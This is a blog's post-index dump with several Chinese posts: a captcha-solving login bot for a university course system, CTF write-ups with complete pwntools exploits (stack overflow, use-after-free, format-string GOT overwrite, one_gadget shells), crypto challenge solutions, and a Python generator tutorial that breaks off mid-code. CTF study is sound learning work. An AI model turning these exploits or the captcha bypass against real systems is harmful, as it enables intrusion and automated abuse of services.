255, 255, 255, 255], 'v':[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255], 'b':[255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255], 'n':[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255], 'm':[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 255, 255, 0, 0, 0, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 255, 255, 0, 0, 0, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 0, 0],&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114# -*- coding: UTF-8 -*-import requestsimport webbrowserimport reimport osimport timefrom ocr import *from PIL import Image__Author__ = 'LiuLian'# 测试环境Python2.7.16# Create for fun!class Spider(): def __init__(self): self.headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36', 'Referer': 'http://jwgl.sdust.edu.cn/' &#125; self.seesion = requests.session() print('[+] Session初始化完成!') self.userAccount = raw_input('请输入学号:') self.userPassword = raw_input('请输入密码:') self.dataStr = '' self.safeCode = '' self.encoded = '' def get_dataStr(self): dataStrUrl = 'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess' self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content print('[+] dataStr 已获取!') def get_safeCode(self): safeCodeUrl = 'http://jwgl.sdust.edu.cn/verifycode.servlet' safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content f = open('safeCode.jpg', 'wb') f.write(safeCodeCont) f.close() img = Image.open('safeCode.jpg') #img.show() img = identificationCodeHandle(img) safeCode = identify(img) print '识别的验证码为: ' + safeCode #safeCode = raw_input('请输入验证码:') os.remove('safeCode.jpg') self.safeCode = safeCode print('[+] 验证码已获取!') def get_encoded(self): scode = self.dataStr.split('#')[0] sxh = self.dataStr.split('#')[1] code = self.userAccount + '%%%' + self.userPassword encode = '' i = 0 while i &lt; len(code): if i &lt; 20: encode += code[i:i + 1] + scode[0:int(sxh[i:i + 1])] scode = scode[int(sxh[i:i + 1]):len(scode)] else: encode += code[i:len(code)] i = len(code) i += 1 self.encoded = encode print('[+] encoded已获取!') def login(self): loginUrl = 'http://jwgl.sdust.edu.cn/Logon.do?method=logon' self.get_dataStr() self.get_safeCode() self.get_encoded() login_data = &#123; 'encoded': self.encoded, 'RANDOMCODE': self.safeCode &#125; while True: html = self.seesion.post(url=loginUrl, data=login_data, headers=self.headers).content if html.find('&lt;title&gt;学生个人中心&lt;/title&gt;') != -1: print('[+] 登录成功! :)\\n姓名、学号如下:') pattern = r'&lt;div id=\"Top1_divLoginName\" class=\"Nsb_top_menu_nc\" style=\"color: #000000;\"&gt;(.+?)&lt;/div&gt;' name_num = re.findall(pattern=pattern,string=html)[0].decode('utf-8') print(name_num) break elif html.find('&lt;font color=\"red\"&gt;验证码无效,请重新登录!&lt;/font&gt;') != -1: print('[-] 验证码输入错误 :(,请重试该程序...') time.sleep(2) exit(0) else: print('[-] 登录失败 :( ,正在尝试重新登录...') time.sleep(1) continue def get_class_schedule(self): \"获得学期理论课表并展示\" class_schedule_url = 'http://jwgl.sdust.edu.cn/jsxsd/xskb/xskb_list.do?Ves632DSdyV=NEW_XSD_PYGL' f = open('schedule.html', 'wb') html = self.seesion.get(url=class_schedule_url, headers=self.headers).content f.write(html) f.close() webbrowser.open('schedule.html') # os.remove('schedule.html') def Teacher_evaluation(self): \"进行教师评价\" evaluation_url = 'http://jwgl.sdust.edu.cn/jsxsd/xspj/xspj_find.do?Ves632DSdyV=NEW_XSD_JXPJ' def Robbing_class(self): \"抢课\" robbing_url = 'http://jwgl.sdust.edu.cn/jsxsd/xsxkRedis/xklc_list?Ves632DSdyV=NEW_XSD_PYGL'if __name__ == '__main__': test = Spider() test.login() #test.get_class_schedule()测试发现，这个代码对m和n的识别度较差，其他都很好，总体识别成功率还是有80%左右的。0x03 Maybe have more完成登录以后就可以嘿嘿嘿了。最后吐槽一句：垃圾强智系统爬爬爬","categories":[{"name":"开发","slug":"开发","permalink":"http://liul14n.top/categories/开发/"}],"tags":[]},{"title":"一道有(我)意(好)思(菜)的stack题目","slug":"一道有-我-意-好-思-菜-的stack题目","date":"2020-03-29T13:31:55.000Z","updated":"2020-03-29T13:52:27.064Z","comments":true,"path":"2020/03/29/一道有-我-意-好-思-菜-的stack题目/","link":"","permalink":"http://liul14n.top/2020/03/29/一道有-我-意-好-思-菜-的stack题目/","excerpt":"","text":"0x00 前言这是大佬发我的题目，看名字挺easy，但是做起来却是…由于Rules的规定，这里不写明题目的名字以及题目的来源，这篇博文主要为了自己日后复习。0x01 分析本以为是easy的一道rop，但是当我checksec以后…12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled开着PIE、FULL RELRO、NX….555555，不过幸亏没开canary…题目变得棘手起来这里返回地址似乎可以利用一下，不过利用之前要先修改一下。通过disassemble 0x7ffff7a05b97命令可以查看这个地址附近的反汇编当我们执行完main的leave和ret以后可以注意到，程序执行到0x00007ffff7a05b97，但是注意此处的前两条汇编，这是在call rax，而rax存着rsp+0x18的内容，来看一下rsp+0x18里面存的什么12pwndbg&gt; x/gx $rsp+0x180x7fffffffdd68: 0x00005555555549c4里面存的是main函数的起始地址… 太巧了！如果把原本main的返回地址0x00007ffff7a05b97修改为0x00007ffff7a05b90，那就可以让程序再次执行main函数，并且还能通过main函数里面的puts连带泄露出__libc_start_main的地址，然后one_gadget再次构造payload即可。0x02 完整EXP12345678910111213141516171819202122from pwn import *context(log_level = 'debug',arch = 'amd64',os = 'linux')#c = process('./stack')c = remote('**************',*****)elf = ELF('./stack')libc = ELF('./libc-2.27.so')payload = 'a'*0x80 + 'b'*8 + '\\x90'c.sendline(payload)#Look here,using sendlinec.recvuntil('aabbbbbbbb')addr = u64(c.recv(6).ljust(8,'\\x00'))libc_start_main = addr + 7 - 231libcbase = libc_start_main - libc.symbols['__libc_start_main']success(hex(libcbase))payload = 'a'*0x80 + 'b'*8 + p64(libcbase + 0x4f2c5)#one_gadgetc.sendline(payload)c.interactive()exp中注释的位置用的sendline，这也是因为main的read_n函数是如下代码这也使得\\n或者\\x00不会覆盖掉其他地方。由于Rules的规定，remote里的host和port这里不写出来。确实挺有意思的一道题目，奇怪的知识增加了。","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"[BJDCTF 2nd]","slug":"BJDCTF-2nd","date":"2020-03-21T08:18:42.000Z","updated":"2020-03-23T19:27:50.645Z","comments":true,"path":"2020/03/21/BJDCTF-2nd/","link":"","permalink":"http://liul14n.top/2020/03/21/BJDCTF-2nd/","excerpt":"","text":"前言菜是原罪MiscSecret下载下来是个压缩包，解一下伪加密，得到一个名为Secret的文件，16进制查看以后发现存在IHDR这个Png文件的标志位，故推测这是个png文件，但缺少了头部的89 50 4E 47这四个字节，补齐，改拓展名为png即可，可以看到一堆HEX,转ASCII即为flag。A_Beautiful_Picture改一下IHDR就能看到flagEasybababinwalk一下，发现有zip，提取出来，里面有个里面全是出题人.jpg，实际上这是个avi文件，然后avi抽帧，有好多二维码，每个二维码能扫出来一部分flag，组合起来是一串base16，解码得到疑似flag的字符串，看着像栅栏，但实际上不是，但是都是单词。。。还有很明显的恶搞意味，修改修改顺序就得到flag。BJD{imagin_love_Y1ng}小姐姐-y1ng16进制查看器打开以后搜BJD即可。。。Real_EasyBaBa这题已吐…看着WP都难搞……圣火昭昭这道题目相比于其他脑洞杂项题，还是有一些可以学习的新知识点的。TARGZ-y1ng套娃题目，全当练算法了，WP说压缩了300层。。。。也就是300层套娃。。。压缩包的名字就是解压密码。。。有个坑点…这些都是zip，但拓展名都是tar.gz1234567891011121314151617181920212223# -*- coding: UTF-8 -*-import osimport zipfileimport timepath = 'C:\\\\Users\\\\LiuLian\\\\Desktop\\\\test\\\\'count = 0t0 = time.time()while True: try: name = os.listdir(path)[0] zip = zipfile.ZipFile(path+name,'r') newfilename = zip.namelist()[0] pwd = name.replace('.tar.gz','') zip.extract(newfilename,path,pwd) zip.close() os.remove(path+name) count += 1 except: print '[*] error or finished!' t1 = time.time() breakprint '总共运行了' + str(t1-t0) + '秒'print '总共套了' + str(count) + '层娃'123[*] error or finished!总共运行了22.1809999943秒总共套了298层娃运行就能拿到一个名为flag的文件，里面就是flag。脚本都跑了二十二秒多…. 手动解压的话估计要累到死。。。运行结果显示总共套了298层娃。。。。Imagin开场曲挺有意思的杂项，就纯听力题…不过通过这个题了解到一个挺好玩的东西叫MikutapBJD{MIKUTAP3313313}ReverseguessgameIDA加载,Shift+F12即可看到flag。。。。。。8086这题考察汇编。但一些代码被IDA识别为数据了，按C还原为代码，即可看到程序的逻辑所以对这个字符串]U[du~|t@{z@wj.}.~q@gjz{z@wzqW~/b;进行与0x1f异或的操作即可flag: BJD{jack_de_hu1b1an_xuede_henHa0}Pwn写在前面本次CTF的pwn题大部分都是Ubuntu19.04的，libc是libc-2.29.so，但通过patchelf依然可以在其他版本的U buntu上进行本地调试。r2t312345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000)存在后门函数0x804858B dl_registery()调用system(&#39;/bin/sh&#39;)main函数的read处没有栈溢出，接着看name_check这里的strcpy可以操作一波，但是需要先绕过前面的长度检测，来看一下汇编可以看到这里，调用完strlen以后长度保存在eax中，而这里是令v3 = al然后再进行的长度验证，也就是说真正验证的是长度的低字节。所以就可以先构造好payload，然后payload = payload.ljust(size,&#39;a&#39;),size取0x1040x108或者0x2040x208或者… 只要让它低字节在0x04~0x08之间即可，当然也不能超过read的size。还有一点需要注意，sendline相比send要多出一个\\n，这也占size的。1234567891011121314from pwn import *context(log_level = 'debug',arch = 'i386',os = 'linux')c = process('./r2t3')#c = remote('node3.buuoj.cn',29366)backdoor = 0x804858B#gdb.attach(c,'b * 0x80485E1')c.recvuntil('Please input your name:\\n')payload = 'a'*0x11payload += 'b'*4payload += p32(backdoor) + p32(0xdeadbeef)payload = payload.ljust(0x106,'a')c.send(payload)c.interactive()one_gadget12345Arch: amd64-64-littleRELRO: Full RELROStack: Canary foundNX: NX enabledPIE: PIE enabled程序保护全开但是在init函数里面存在一个leak，泄露了printf的地址，而且题目也提供了libc，所以可以泄露出libcbasemain函数也格外的和谐，直接读入one_gadget然后调用…12345678910111213141516171819 one_gadget libc-2.29.so 0xe237f execve(\"/bin/sh\", rcx, [rbp-0x70])constraints: [rcx] == NULL || rcx == NULL [[rbp-0x70]] == NULL || [rbp-0x70] == NULL0xe2383 execve(\"/bin/sh\", rcx, rdx)constraints: [rcx] == NULL || rcx == NULL [rdx] == NULL || rdx == NULL0xe2386 execve(\"/bin/sh\", rsi, rdx)constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL0x106ef8 execve(\"/bin/sh\", rsp+0x70, environ)constraints: [rsp+0x70] == NULL这里似乎只有第四个能用12345678910111213141516from pwn import *c = remote('node3.buuoj.cn',26393)#c = process('./one_gadget')elf = ELF('./one_gadget')libc = ELF('./libc-2.29.so')c.recvuntil('here is the gift for u:')libcbase = int(c.recvuntil('\\n',drop = True),16) - libc.symbols['printf']success('libcbase = ' + hex(libcbase))oneGadget = libcbase + 0x106ef8c.sendline(str(oneGadget))c.interactive()ydsneedgirlfriend2真·入门级堆题，感谢出题人不杀之恩。12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000)题目提供4个功能12341.add a girlfriend2.dele a girlfriend3.show a girlfriend4.exit其中add里面，只会在第一次add的时候在girlfriends[0]申请0x10大小的堆块。在*girlfriends[0]存放的是最新一次add时，申请的name的chunk。在*girlfriends[1]存放的是print_girlfriend_name的函数指针。delete函数存在UAF漏洞，free掉但未置为NULL。而且出题人太贴心了，给了backdoor函数思路较为简单，借助Fastbin的FILO特性，结合delete函数中的free顺序可得1234add(0x10,'aaaa')delete(0)add(0x10,'b'*8 + p64(backdoor))#change print_girlfriend_name -&gt; backdoorshow(0)# do backdoor完整EXP1234567891011121314151617181920212223242526272829303132333435from pwn import *context(arch = 'amd64',os = 'linux')c = remote('node3.buuoj.cn',26074)#c = process('./ydsneedgirlfriend2')elf = ELF('./ydsneedgirlfriend2')girlfriends = 0x6020A0backdoor = 0x400D86def add(length,name): c.recvuntil('u choice :\\n') c.sendline('1') c.recvuntil('Please input the length of her name:\\n') c.sendline(str(length)) c.recvuntil('Please tell me her name:\\n') c.send(name)def delete(idx): c.recvuntil('u choice :\\n') c.sendline('2') c.recvuntil('Index :') c.sendline(str(idx))def show(idx): c.recvuntil('u choice :\\n') c.sendline('3') c.recvuntil('Index :') c.sendline(str(idx))add(0x10,'aaaaaaaa')delete(0)add(0x10,'bbbbbbbb'+p64(backdoor))show(0)c.interactive()r2t412345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x3ff000)main函数有明显的格式化字符串漏洞和栈溢出，但只溢出了8个字节，只够覆盖掉rbp存在backdoor函数，调用system(&#39;cat flag&#39;)看了半天没想起来怎么做，canary过不掉。。。赛后看了wp以后…既然canary过不掉，那就直接故意触发吧，修改__stack_chk_fail_got为backdoor即可。。。。这里我之前写的fmtstr_payload64生成的payload的长度为0x40，超出read的size了，很无奈，只能按short类型来手动写了。1234567891011121314151617181920212223from pwn import *context(log_level = 'debug',arch = 'amd64',os = 'linux')c = remote('node3.buuoj.cn',27717)#c = process('./r2t4')elf = ELF('./r2t4')__stack_chk_fail=elf.got['__stack_chk_fail']success('__stack_chk_fail.got = ' + hex(__stack_chk_fail))sleep(1)backdoor = 0x400626payload = '%64c%9$hn%1510c%10$hnaaa'payload += p64(__stack_chk_fail+2)payload += p64(__stack_chk_fail)success('payload.length = ' + hex(len(payload)))c.sendline(payload)c.interactive()secret12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x3ff000)挺蛋疼的一道题目让你猜秘密,实际上就是猜数字，虽然这些数字在IDA中都能通过正则表达式匹配出来。。。但是一共1万个！！有的老哥真匹配出来然后send了一万次….被BUU封IP了….官方WP里的做法就比较巧妙name实际大小为0x10，但却read了0x16个字节而name与times_ptr紧邻，多出的6个字节可以用来覆盖times_ptr注意这里是times_ptr,这是个指针，指向真实的times程序初始times = 10000，每猜对一次，times -= 1。程序给出了system函数，而且当猜错以后会调用printf(name);起初想着能不能利用这个格式化字符串漏洞,但是仔细想了想,似乎不太可行。但是我们可以通过修改printf_got为system，令name以/bin/sh;开头，触发system(‘/bin/sh’)123456789101112131415pwndbg&gt; gotGOT protection: Partial RELRO | GOT functions: 11 [0x46d018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7e64cc0 (puts) ◂— push r14[0x46d020] write@GLIBC_2.2.5 -&gt; 0x7ffff7eee010 (write) ◂— lea rax, [rip + 0xdd3b9][0x46d028] strlen@GLIBC_2.2.5 -&gt; 0x7ffff7f67090 ◂— mov ecx, edi[0x46d030] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401066 (__stack_chk_fail@plt+6) ◂— push 3[0x46d038] system@GLIBC_2.2.5 -&gt; 0x401076 (system@plt+6) ◂— push 4[0x46d040] printf@GLIBC_2.2.5 -&gt; 0x401086 (printf@plt+6) ◂— push 5[0x46d048] read@GLIBC_2.2.5 -&gt; 0x7ffff7eedf70 (read) ◂— lea rax, [rip + 0xdd459][0x46d050] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7e653d0 (setvbuf) ◂— push r13[0x46d058] atoi@GLIBC_2.2.5 -&gt; 0x4010b6 (atoi@plt+6) ◂— push 8[0x46d060] sprintf@GLIBC_2.2.5 -&gt; 0x4010c6 (sprintf@plt+6) ◂— push 9 /* 'h\\t' */[0x46d068] exit@GLIBC_2.2.5 -&gt; 0x4010d6 (exit@plt+6) ◂— push 0xa /* 'h\\n' */可以看到printf@plt + 6 = 0x401086 , system@plt + 6 = 0x401076只相差0x10。加之每猜对一次，times -= 1，我们可以通过溢出覆盖times_ptr为0x46d040，然后答对一定的次数，让printf_got变为system_plt，然后故意答错，触发printf(name)即触发system(&#39;/bin/sh&#39;)这里有一点需要注意：官方WP给的是答对0x10次，让printf_got变成0x401076也就是system@plt + 6，但是亲测打不通，调试以后发现其他一切正常，但是调用system的时候报段错误…这里我试了一下，答对0x14或者0x15次，也就是让printf_got变成system@plt+2或者system@plt+1才可。附上EXP:1234567891011121314151617181920212223from pwn import *context(arch = 'amd64',os = 'linux')#c = process('./secret')c = remote('node3.buuoj.cn',29217)elf = ELF('./secret')L = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3f7d,0x357a,0x3cf5, 0x2f9e,0x41ea,0x48d8,0x2763,0x474c,0x3809,0x2e63,0x2f4a, 0x3298,0x28f3,0x3d1b,0x449e,0x3328]success(hex(elf.got['printf']))c.recvuntil('What\\'s your name?')c.sendline('/bin/sh;AAAAAAAA'+p32(elf.got['printf']))#use p32()for i in L: c.recvuntil('Secret:') c.sendline(str(i))#gdb.attach(c, 'b * 0x40133a')c.recvuntil('Secret:')c.sendline('66666')c.interactive()Crypto签到-y1ngbase64,decode一下就好了。老文盲了脑洞够大。罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝这句话的谐音就是BJD大括号这就是福莱格(flag)直接交了吧大括号所以flag为BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}燕言燕语-y1ng12小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20给了一串HEX，转ASCII以后是yanzi ZJQ{xilzv_iqssuhoc_suzjg}猜测是维吉尼亚密码，密钥是yanzi，成功解密flag为BJD{yanzi_jiushige_shabi}cat_flag小猫很可爱。从上往下，每一行代表一个二进制数，吃饭团的表示0，吃鸡腿的表示1bin转ascii得到flag。BJD{M!a0~}灵能精通-y1ng这题有点水，赛后看WP才知道这个密码是圣堂武士密码，通过查题目的题干能知道这是星际争霸里面的一个角色的一个技能台词？？！！Y1nglish-y1ng给了一个txt123Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot&apos;d z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf&apos;o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. &apos;Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,&apos; Pzffw ozqh,&apos;os tsn wse azt czw usf lw hqttkf!&apos; Tsn q nqbb vqjk wse npzd wse nztd.MIH&#123;cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw&#125;下面有类似于flag的东西，但开头不是BJD而是MIH，盲猜维吉尼亚密码。quipqiup在线解密,指定MIH=BJD,可以得到1Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn&apos;t a Japanese name but he is really a Japanese. Harry woryed in a lawyer&apos;s office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. &apos;I have never borrrowed any money from you,&apos; Harry said,&apos;so now you can pay for my dinner!&apos; Now i will give you what you want. BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;但是提交一直不成功，修改Cr4cy为Cr4zy也不成功，去群里看了看公告，发现有地方需要改。读了读上面那段话，发现那段话里面该是k的地方全变成了y，所以修改Cr4cy为Cr4ck。BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}rsa0nc连接以后有如下回显，好像因为靶机不同，具体的回显也不同123456789e=15549851p+q=20863578032664632805803247009000344892321432818463015557495155759957380706376484569788486497652311136327651058215395343509008398250545579129166602948550344p-q=-3836010044914889517982485973339196492824587499988100701447424038126206797371420912301320412708697078766834687669285168738335604543547774164235502781085390c=4782030868853667565973405123820473791306349016814206730867994644057366366041543210479132972104172048240423839135782546226203699218766360325105809914202058277363302078844368666294196255268662132894564282205856907640709197985497727498750715398166130536191311534456423579523525954133760668637482507379670206959flag=??????….直接解出来p和q 然后…直接做就行…12345678910111213141516171819import gmpy2p =gmpy2.mpz(8513783993874871643910380517830574199748422659237457428023865860915586954502531828743583042471807028780408185273055087385336396853498902482465550083732477)q =gmpy2.mpz(12349794038789761161892866491169770692573010159225558129471289899041793751873952741044903455180504107547242872942340256123672001397046676646701052864817867)e =gmpy2.mpz(15549851)phi_n= (p - 1) * (q - 1)n=p*qd = gmpy2.invert(e, phi_n)c=gmpy2.mpz(4782030868853667565973405123820473791306349016814206730867994644057366366041543210479132972104172048240423839135782546226203699218766360325105809914202058277363302078844368666294196255268662132894564282205856907640709197985497727498750715398166130536191311534456423579523525954133760668637482507379670206959)m=pow(c,d,n)print 'm = ' + str(m)print hex(m)[2:].replace('L','').decode('hex')rsa1同样是靶机不同，回显不同和rsa0一样，不过这个要根据完全平方公式推出来p和q、尝试过得出来pq（也就是n）以后直接分解n，但是分解难度太大，所以还是根据完全平方公式推p和q吧。有一处是需要对(p+q)^2进行开放，普通的math.sqrt()方法因为这个数太大了而会报错，这里需要用gmpy2.iroot(gg,2),gg代表(p+q)^2，很幸运，正好开平方，也就是得到的结果进行平方以后正好等于(p+q)^2得到pqec以后脚本和rsa0就一样了。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://liul14n.top/categories/CTF/"}],"tags":[]},{"title":"[Python]生成斐波那契数列的几种方式的对比与分析","slug":"Python-生成斐波那契数列的几种方式的对比与分析","date":"2020-03-20T12:54:06.000Z","updated":"2020-12-22T08:50:15.201Z","comments":true,"path":"2020/03/20/Python-生成斐波那契数列的几种方式的对比与分析/","link":"","permalink":"http://liul14n.top/2020/03/20/Python-生成斐波那契数列的几种方式的对比与分析/","excerpt":"","text":"前言写这篇文章为了记录yield的用法、iterable对象相关知识、generator function 、以及一些python的小细节测试环境:python2.7.16简介斐波那契（Fibonacci）数列：除第一个和第二个数外，任意一个数都可由前两个数相加得到。方法一123456789# -*- coding: UTF-8 -*- def fab(max): n, a, b = 0, 0, 1 while n &lt; max: print b a, b = b, a + b n = n + 1fab(5)该方法是常规方法，通过在函数里面调用print b来实现打印。但是该方法可复用性较差，因为 fab 函数返回 None，其他函数无法获得该函数生成的数列。方法二要提高 fab 函数的可复用性，最好不要直接打印出数列，而是返回一个 List。12345678910111213# -*- coding: UTF-8 -*- def fab(max): n, a, b = 0, 0, 1 L = [] while n &lt; max: L.append(b) a, b = b, a + b n = n + 1 return Lfor n in fab(5): print n该方法能满足复用性的要求，但该函数在运行中占用的内存会随着参数 max 的增大而增大，如果要控制内存占用，最好不要用 List来保存中间结果，而是通过 iterable 对象来迭代。细节1for i in range(1000): passrange()方法会导致生成一个 1000 个元素的 List。1for i in xrange(1000): passxrange()方法则不会生成一个 1000 个元素的 List，而是在每次迭代中返回下一个数值，内存空间占用很小。因为 xrange 不返回 List，而是返回一个 iterable 对象。方法三123456789101112131415161718192021# -*- coding: UTF-8 -*-class Fab(object): def __init__(self, max): self.max = max self.n, self.a, self.b = 0, 0, 1 def __iter__(self): return self def next(self): if self.n &lt; self.max: r = self.b self.a, self.b = self.b, self.a + self.b self.n = self.n + 1 return r raise StopIteration() for n in Fab(5): print nFab 类通过 next() 不断返回数列的下一个数，内存占用始终为常数，但是这种方法的代码不够简洁。方法四如果我们想要保持第一版 fab 函数的简洁性，同时又要获得iterable 的效果，yield 就派上用场了123456789101112# -*- coding: UTF-8 -*- def fab(max): n, a, b = 0, 0, 1 while n &lt; max: yield b # 使用 yield # print b a, b = b, a + b n = n + 1 for n in fab(5): print n简单地讲，yield 的作用就是把一个函数变成一个 generator(生成器)，带有 yield 的函数不再是一个普通函数，Python 解释器会将其视为一个 generator，调用 fab(5) 不会执行 fab 函数，而是返回一个iterable 对象！在 for 循环执行时，每次循环都会执行 fab 函数内部的代码，执行到yield b时，fab 函数就返回一个迭代值，下次迭代时，代码从 yield b 的下一条语句继续执行，而函数的本地变量看起来和上次中断执行前是完全一样的，于是函数继续执行，直到再次遇到yield。也可以手动调用 fab(5) 的 next() 方法（因为fab(5)是一个generator 对象，该对象具有next()方法），这样我们就可以更清楚地看到 fab 的执行流程：123456789101112131415&gt;&gt;&gt;f = fab(5) &gt;&gt;&gt; f.next() 1 &gt;&gt;&gt; f.next() 1 &gt;&gt;&gt; f.next() 2 &gt;&gt;&gt; f.next() 3 &gt;&gt;&gt; f.next() 5 &gt;&gt;&gt; f.next() Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt; StopIteration在一个 generator function 中，如果没有 return，则默认执行至函数完毕，如果在执行过程中 return，则直接抛出 StopIteration 终止迭代。示例:如果直接对文件对象调用 read() 方法，会导致不可预测的内存占用。好的方法是利用固定长度的缓冲区来不断读取文件内容。通过 yield，我们不再需要编写读文件的迭代类，就可以轻松实现文件读取：123456789def read_file(fpath): BLOCK_SIZE = 1024 with open(fpath, 'rb') as f: while True: block = f.read(BLOCK_SIZE) if block: yield block else: 